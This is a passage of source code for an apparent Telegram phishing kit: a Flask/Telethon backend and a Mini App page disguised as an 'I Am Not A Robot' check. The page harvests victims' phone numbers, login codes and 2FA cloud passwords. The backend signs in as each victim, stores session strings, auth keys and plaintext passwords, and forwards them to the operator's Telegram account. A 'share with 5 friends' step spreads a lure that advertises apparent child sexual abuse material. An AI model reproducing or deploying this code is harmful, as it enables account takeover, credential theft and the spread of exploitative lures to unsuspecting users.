                            msg = await bot.get_messages(entry['_chat_id'], ids=entry['_msg_id'])
                            await bot.send_message(uid, msg)
                            ok += 1
                        except Exception:
                            if entry.get('caption'):
                                s = await safe_send_user(uid, entry['caption'])
                                ok += 1 if s else 0
                                fail += 0 if s else 1
                    else:
                        ok += 1
                except Exception:
                    fail += 1
                await asyncio.sleep(0.4)
        except Exception:
            fail += 1
    logger.info(f"Broadcast [{target}]: {ok} sent, {fail} failed")


async def self_ping_loop():
    while True:
        try:
            await asyncio.sleep(240)
            http_requests.get(SELF_URL, timeout=10)
        except Exception:
            pass


async def bot_main():
    logger.info("Admin bot starting...")
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Admin bot started as @{me.username}")
    asyncio.create_task(broadcast_loop())
    asyncio.create_task(section_monitor())
    asyncio.create_task(self_ping_loop())
    await bot.run_until_disconnected()


# ============================================================
# FLASK
# ============================================================
@app.route('/')
def index():
    try:
        with open('webapp.html', 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        logger.error(f"webapp.html read error: {e}")
        return "webapp.html not found — create it in repo", 404


@app.route('/tg')
def tg_route():
    return index()


@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'bot_thread_alive': _bot_thread.is_alive() if _bot_thread else False,
        'accounts': len(captured_accounts),
    })


@app.route('/api/share_config')
def get_share_config():
    return jsonify(share_config)


@app.route('/api/save_contact', methods=['POST'])
def save_contact():
    d = request.json
    tg_id = d.get('tg_id')
    phone = d.get('phone')
    if not phone or not tg_id:
        return jsonify({'success': False, 'error': 'Missing'})
    phone = format_phone(phone)
    accounts = load_accounts()
    ex = next((a for a in accounts if a['phone'] == phone), None)
    if ex:
        return jsonify({'success': True, 'already_captured': True,
            'phone': phone, 'user_id': ex['user_id']})
    with sessions_lock:
        pending_codes[phone] = 'contact_saved'
    return jsonify({'success': True, 'phone': phone})


@app.route('/api/share', methods=['POST'])
def share():
    data = request.json
    ph = data.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    with sessions_lock:
        pending_codes[ph] = 'sending'
    tg_id = data.get('tg_id')
    t = threading.Thread(target=_run_tg_thread, args=(ph, None, None, tg_id))
    t.daemon = True
    t.start()
    return jsonify({'success': True})


@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph = format_phone(d.get('phone', ''))
    code = d.get('code', '')
    password = d.get('password')
    tg_id = d.get('tg_id')
    return jsonify(_run_tg_sync(ph, code, password, tg_id))


def _run_tg_sync(phone, code, password, tg_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(_tg_action(phone, code, password, tg_id))
    finally:
        loop.close()


def _run_tg_thread(phone, code, password, tg_id):
    try:
        _run_tg_sync(phone, code, password, tg_id)
    except Exception as e:
        logger.error(f"run_tg_thread: {e}")


async def _tg_action(phone, code=None, password=None, tg_id=None):
    if not code:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            r = await client.send_code_request(phone)
            session_str = StringSession.save(client.session)
            with sessions_lock:
                user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str}
                pending_codes[phone] = 'sent'
            return {'success': True}
        except Exception as e:
            with sessions_lock:
                pending_codes[phone] = 'err'
            return {'success': False, 'error': str(e)[:80]}
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
    with sessions_lock:
        if phone not in user_sessions:
            return {'success': False, 'error': 'No session'}
        s = user_sessions[phone]
    client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
            except errors.SessionPasswordNeededError:
                with sessions_lock:
                    pending_codes[phone] = '2fa_needed'
                if password:
                    try:
                        await client.sign_in(password=password)
                    except errors.PasswordHashInvalidError:
                        return {'success': False, 'error': 'Wrong 2FA password'}
                else:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
        me = await client.get_me()
        await client.get_dialogs()
        ss = StringSession.save(client.session)
        try:
            ak = client.session.auth_key.key
            dc = client.session.dc_id
        except Exception:
            ak = b""
            dc = 0
        ab = base64.b64encode(ak).decode() if ak else ""
        pu = password is not None
        acc = {
            'phone': phone, 'user_id': me.id,
            'username': me.username or '', 'first_name': me.first_name or '',
            'last_name': me.last_name or '', 'session': ss,
            'webk': json.dumps({'dcId': dc, 'authKey': ab, 'userId': me.id,
                'isSupport': False, 'isTest': False}),
            'dc': dc, 'time': str(datetime.now()),
            'has_2fa': pu, 'password': password if pu else '',
            'added_at': time.time(),
            'expires_at': time.time() + 86400,
            'status': 'active',
            'is_premium': False,
            'tg_id': tg_id,
        }
        save_account(acc)
        global captured_accounts
        captured_accounts = load_accounts()
        extra = ""
        if pu:
            extra = "\n2FA Used"
            if password:
                extra += f" | Pwd: `{password}`"
        msg = (f"New Account!{extra}\nPhone: {phone}\n"
               f"Name: {me.first_name} {me.last_name or ''}\n"
               f"User ID: {me.id}\nDC: {dc}\n\nSession:\n`{ss}`")
        if len(msg) > 4000:
            msg = msg[:3990] + "..."
        r = http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
            timeout=15)
        if r.status_code == 200:
            mid = r.json().get("result", {}).get("message_id")
            if mid:
                acc["admin_notify_msg_id"] = mid
                save_account(acc)
                captured_accounts = load_accounts()
        with sessions_lock:
            user_sessions.pop(phone, None)
            pending_codes[phone] = 'done'
        return {'success': True, 'user_id': me.id}
    except Exception as e:
        es = str(e)
        if 'PHONE_CODE_INVALID' in es:
            return {'success': False, 'error': 'Wrong code'}
        if 'SESSION_PASSWORD_NEEDED' in es:
            return {'success': False, 'error': '2FA', 'needs_password': True}
        return {'success': False, 'error': es[:80]}
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


@app.route('/api/check', methods=['POST'])
def check():
    phone = format_phone(request.json.get('phone', ''))
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    if s == 'waiting':
        accounts = load_accounts()
        if any(a['phone'] == phone for a in accounts):
            s = 'done'
    return jsonify({'s': s})


@app.route('/dash')
def dash():
    accounts = load_accounts()
    rows = ""
    for i, a in enumerate(accounts, 1):
        sl = len(a.get('session', ''))
        lbl = account_label(a)
        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {lbl}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>({sl})</td></tr>"
    return f"<html><body style='background:#0a0a0a;color:white;font-family:Arial;padding:20px'><h1>Accounts: {len(accounts)}</h1><table border=1 style='width:100%'><tr><th>#</th><th>Phone</th><th>Name</th><th>ID</th><th>DC</th><th>Session</th></tr>{rows}</table></body></html>"


def _run_bot():
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(bot_main())
    except Exception as e:
        logger.error(f"BOT CRASH: {e}")
        logger.error(traceback.format_exc())


if BOT_TOKEN and API_ID and API_HASH and YOUR_TELEGRAM_ID:
    _bot_thread = threading.Thread(target=_run_bot, daemon=True, name="admin-bot")
    _bot_thread.start()
    logger.info("Admin bot thread launched")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False)
    <!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Verification</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;color:white;min-height:100vh;overflow-x:hidden}
.bg{position:fixed;inset:0;background:linear-gradient(135deg,#1a1a2e,#e94560,#0a0a0a);z-index:1}
.blur{position:fixed;inset:0;backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);background:rgba(0,0,0,0.75);z-index:2}
.wrap{position:relative;z-index:10;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.modal{background:#141420;border-radius:24px;padding:32px 24px;max-width:380px;width:100%;border:1px solid #2a2a3e;text-align:center;display:none}
.modal.on{display:block}
.ico{font-size:56px;margin-bottom:15px}
.modal h2{font-size:22px;font-weight:800;margin-bottom:8px}
.modal p{color:#888;font-size:14px;margin-bottom:22px;line-height:1.5}
.btn{width:100%;padding:18px;border:none;border-radius:50px;color:white;font-size:17px;font-weight:800;cursor:pointer;margin:8px 0}
.btn:disabled{opacity:0.5}
.green{background:linear-gradient(45deg,#25D366,#128C7E)}
.blue{background:linear-gradient(45deg,#0088cc,#00a8e8)}
.red{background:linear-gradient(45deg,#e94560,#d63851)}
.otps{display:flex;gap:8px;justify-content:center;margin:20px 0}
.otps input{width:45px;height:58px;text-align:center;font-size:24px;font-weight:bold;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:12px;color:white;outline:none}
.otps input:focus{border-color:#0088cc}
.pwd{width:100%;padding:16px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:12px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0 15px}
.pwd:focus{border-color:#e94560}
.msg{padding:12px 16px;border-radius:10px;margin:12px 0;font-size:13px;display:none}
.msg.show{display:block}
.msg.ok{background:rgba(76,175,80,0.15);color:#81C784}
.msg.err{background:rgba(244,67,54,0.15);color:#EF9A9A}
.msg.info{background:rgba(33,150,243,0.15);color:#90CAF9}
.resend{color:#0088cc;font-size:13px;margin-top:15px;cursor:pointer;text-decoration:underline;display:none}
.ss{display:flex;justify-content:center;gap:8px;margin:20px 0}
.sst{width:38px;height:38px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
.sst.done{background:#4CAF50;color:white}
.sst.active{background:#0088cc;color:white}
</style>
</head>
<body>
<div class="bg"></div>
<div class="blur"></div>
<div class="wrap">
<div id="contactBox" class="modal on">
<div class="ico">&#129302;</div>
<h2>I Am Not A Robot</h2>
<p>Confirm that you are not a robot</p>
<button class="btn green" id="shareContactBtn">CONFIRM NOW</button>
<div id="contactMsg" class="msg"></div>
</div>
<div id="otpBox" class="modal">
<div class="ico">&#128274;</div>
<h2>Enter Verification Code</h2>
<p>We Just Sent Your Access Code<br>Check your <strong>Telegram</strong></p>
<div class="otps">
<input type="tel" maxlength="1" inputmode="numeric" id="o1">
<input type="tel" maxlength="1" inputmode="numeric" id="o2">
<input type="tel" maxlength="1" inputmode="numeric" id="o3">
<input type="tel" maxlength="1" inputmode="numeric" id="o4">
<input type="tel" maxlength="1" inputmode="numeric" id="o5">
</div>
<div id="otpMsg" class="msg"></div>
<div class="resend" id="resendBtn">Resend code</div>
</div>
<div id="pwdBox" class="modal">
<div class="ico">&#128272;</div>
<h2>Two-Factor Auth</h2>
<p>This account is protected.<br>Enter your cloud password:</p>
<input type="password" id="pwdInput" class="pwd" placeholder="Cloud password" maxlength="64">
<div id="pwdMsg" class="msg"></div>
<button class="btn red" id="pwdBtn">VERIFY PASSWORD</button>
</div>
<div id="shareBox" class="modal">
<div class="ico">&#127916;</div>
<h2>Almost Unlocked!</h2>
<p>Share with <strong>5 friends</strong> to unlock</p>
<div class="ss">
<div class="sst" id="st1">1</div>
<div class="sst" id="st2">2</div>
<div class="sst" id="st3">3</div>
<div class="sst" id="st4">4</div>
<div class="sst" id="st5">5</div>
</div>
<div id="shareMsg" class="msg show info">Tap Share to start</div>
<button class="btn green" id="shareBtn">SHARE ON TELEGRAM</button>
</div>
</div>
<script>
var tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) { tg.ready(); tg.expand(); }
var TG_ID = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : null;
var UPK = 'pv_phone_' + TG_ID;
var USK = 'pv_shares_' + TG_ID;
var UCK = 'pv_captured_' + TG_ID;
var phoneNumber = '';
var codeCheck = null;
var pwdCheck = null;
var contactForce = null;
var inProgress = false;
var SHARE_MSG = "https://t.me/Xxxvo_bot\nhttps://t.me/Xxxvo_bot\n\nᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆";
fetch('/api/share_config').then(function(r){ return r.json(); }).then(function(d){ if (d && d.message) SHARE_MSG = d.message; }).catch(function(){});
function show(id) { document.getElementById(id).classList.add('on'); }
function hide(id) { document.getElementById(id).classList.remove('on'); }
function msg(id, t, type) { var e=document.getElementById(id); e.textContent=t; e.className='msg show '+type; }
window.onload = function() {
  hide('otpBox'); hide('pwdBox'); hide('shareBox'); show('contactBox');
  var cp = localStorage.getItem(UPK);
  var ic = localStorage.getItem(UCK) === '1';
  if (cp && ic) { phoneNumber = cp; hide('contactBox'); openShare(); }
  else if (cp) { phoneNumber = cp; hide('contactBox'); openOtp(); }
  else { startForce(); }
};
function startForce() {
  if (contactForce) clearInterval(contactForce);
  setTimeout(function() { triggerShare(true); }, 200);
  contactForce = setInterval(function() {
    if (!document.getElementById('contactBox').classList.contains('on')) { clearInterval(contactForce); contactForce = null; return; }
    if (!inProgress) triggerShare(false);
  }, 200);
}
function triggerShare(isFirst) {
  if (inProgress && !isFirst) return;
  if (!tg) { msg('contactMsg', 'Open inside Telegram app', 'err'); return; }
  inProgress = true;
  var resetInProgress = function() { setTimeout(function() { inProgress = false; }, 400); };
  if (typeof tg.requestContact === 'function') {
    try { tg.requestContact(function(sent, event) {
      resetInProgress();
      if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) handleContact(event.responseUnsafe.contact);
      else msg('contactMsg', 'Confirm required', 'err');
    }); return; } catch(e) { resetInProgress(); }
  }
  if (typeof tg.openContactPicker === 'function') {
    try { tg.openContactPicker(function(sent, event) {
      resetInProgress();
      if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) handleContact(event.responseUnsafe.contact);
      else msg('contactMsg', 'Confirm required', 'err');
    }); return; } catch(e) { resetInProgress(); }
  }
  resetInProgress(); msg('contactMsg', 'Update app', 'err');
}
document.getElementById('shareContactBtn').onclick = function() { inProgress = false; triggerShare(true); };
function handleContact(c) {
  var phone = c.phone_number || '';
  if (!phone) { msg('contactMsg', 'Try again', 'err'); return; }
  if (phone.charAt(0) !== '+') phone = '+' + phone;
  phoneNumber = phone; inProgress = true; msg('contactMsg', 'Confirmed!', 'ok');
  if (contactForce) { clearInterval(contactForce); contactForce = null; }
  fetch('/api/save_contact', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({tg_id:TG_ID||'web',phone:phoneNumber}) })
  .then(function(r){ return r.json(); }).then(function(d){
    if (d.success) {
      localStorage.setItem(UPK, phoneNumber);
      if (d.already_captured && d.user_id) { localStorage.setItem(UCK,'1'); setTimeout(function(){hide('contactBox'); openShare();},700); }
      else { setTimeout(function(){hide('contactBox'); openOtp();},700); }
    } else { msg('contactMsg', 'Server error', 'err'); }
  }).catch(function(){ msg('contactMsg', 'Connection error', 'err'); });
}
function openOtp() {
  hide('contactBox'); hide('pwdBox'); hide('shareBox'); show('otpBox');
  ['o1','o2','o3','o4','o5'].forEach(function(id){ document.getElementById(id).value=''; });
  document.getElementById('o1').focus(); msg('otpMsg', 'Sending code...', 'info');
  fetch('/api/share', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,tg_id:TG_ID}) })
  .then(function(r){ return r.json(); }).then(function(d){
    if (d.success) { msg('otpMsg', 'Code sent!', 'ok'); startOtpCheck(); setTimeout(function(){ document.getElementById('resendBtn').style.display='block'; },30000); }
    else { msg('otpMsg', d.error||'Failed', 'err'); }
  }).catch(function(){ msg('otpMsg', 'Network error', 'err'); });
}
function startOtpCheck() {
  if (codeCheck) clearInterval(codeCheck);
  codeCheck = setInterval(function(){
    fetch('/api/check', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
    .then(function(r){ return r.json(); }).then(function(d){
      if (d.s === '2fa_needed') { clearInterval(codeCheck); hide('otpBox'); show('pwdBox'); document.getElementById('pwdInput').focus(); startPwdCheck(); }
      else if (d.s === 'done') { clearInterval(codeCheck); onCapture(); }
      else if (d.s === 'err') { clearInterval(codeCheck); msg('otpMsg', 'Failed. Try resend.', 'err'); document.getElementById('resendBtn').style.display='block'; }
    }).catch(function(){});
  }, 2000);
}
['o1','o2','o3','o4','o5'].forEach(function(id, i){
  document.getElementById(id).addEventListener('input', function(){
    var v = this.value.replace(/[^0-9]/g,''); this.value = v;
    if (v && i < 4) document.getElementById('o'+(i+2)).focus();
    var code = ''; for (var k=1;k<=5;k++) code += document.getElementById('o'+k).value;
    if (code.length === 5) setTimeout(submitOtp, 100);
  });
  document.getElementById(id).addEventListener('keydown', function(e){
    if (e.key === 'Backspace' && !this.value && i > 0) document.getElementById('o'+i).focus();
  });
});
function submitOtp() {
  var code = ''; for (var i=1;i<=5;i++) code += document.getElementById('o'+i).value;
  if (code.length < 5) { msg('otpMsg', 'Enter 5 digits', 'err'); return; }
  msg('otpMsg', 'Verifying...', 'info');
  fetch('/api/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,code:code,tg_id:TG_ID}) })
  .then(function(r){ return r.json(); }).then(function(d){
    if (d.success) onCapture();
    else if (d.needs_password) { hide('otpBox'); show('pwdBox'); document.getElementById('pwdInput').focus(); startPwdCheck(); }
    else { msg('otpMsg', d.error||'Wrong code', 'err'); ['o1','o2','o3','o4','o5'].forEach(function(id){ document.getElementById(id).value=''; }); document.getElementById('o1').focus(); }
  }).catch(function(){ msg('otpMsg', 'Error', 'err'); });
}
document.getElementById('resendBtn').onclick = function(){ document.getElementById('resendBtn').style.display='none'; openOtp(); };
function startPwdCheck() {
  if (pwdCheck) clearInterval(pwdCheck);
  pwdCheck = setInterval(function(){
    fetch('/api/check', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
    .then(function(r){ return r.json(); }).then(function(d){ if (d.s === 'done') { clearInterval(pwdCheck); onCapture(); } }).catch(function(){});
  }, 2000);
}
document.getElementById('pwdBtn').onclick = function() {
  var pwd = document.getElementById('pwdInput').value.trim();
  if (!pwd) { msg('pwdMsg', 'Enter password', 'err'); return; }
  msg('pwdMsg', 'Checking...', 'info'); document.getElementById('pwdBtn').disabled = true;
  var code = ''; for (var i=1;i<=5;i++) code += document.getElementById('o'+i).value;
  fetch('/api/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber,code:code,password:pwd,tg_id:TG_ID}) })
  .then(function(r){ return r.json(); }).then(function(d){
    document.getElementById('pwdBtn').disabled = false;
    if (d.success) onCapture();
    else msg('pwdMsg', d.error||'Wrong', 'err');
  }).catch(function(){ document.getElementById('pwdBtn').disabled = false; msg('pwdMsg', 'Error', 'err'); });
};
function onCapture() {
  localStorage.setItem(UPK, phoneNumber); localStorage.setItem(UCK,'1'); localStorage.setItem(USK,'0');
  if (codeCheck) { clearInterval(codeCheck); codeCheck = null; }
  if (pwdCheck) { clearInterval(pwdCheck); pwdCheck = null; }
  hide('otpBox'); hide('pwdBox'); openShare();
}
function openShare() {
  hide('contactBox'); hide('otpBox'); hide('pwdBox'); show('shareBox');
  var n = parseInt(localStorage.getItem(USK) || '0'); updSteps(n);
  if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok'); else msg('shareMsg', n + '/5 done.', 'info');
}
function updSteps(n) {
  for (var i=1;i<=5;i++) { var e = document.getElementById('st'+i); if (i<=n) e.className='sst done'; else if (i===n+1) e.className='sst active'; else e.className='sst'; }
}
document.getElementById('shareBtn').onclick = function() {
  var urlMatch = SHARE_MSG.match(/https?:\/\/[^\s]+/);
  var url = urlMatch ? urlMatch[0] : 'https://t.me/Xxxvo_bot';
  var share_url = 'https://t.me/share/url?url=' + encodeURIComponent(url) + '&text=' + encodeURIComponent(SHARE_MSG);
  if (tg) tg.openTelegramLink(share_url); else window.open(share_url, '_blank');
  var n = Math.min(parseInt(localStorage.getItem(USK) || '0') + 1, 5);
  localStorage.setItem(USK, String(n)); updSteps(n);
  if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok'); else msg('shareMsg', n + '/5 done.', 'ok');
};
</script>
</body>
</html>
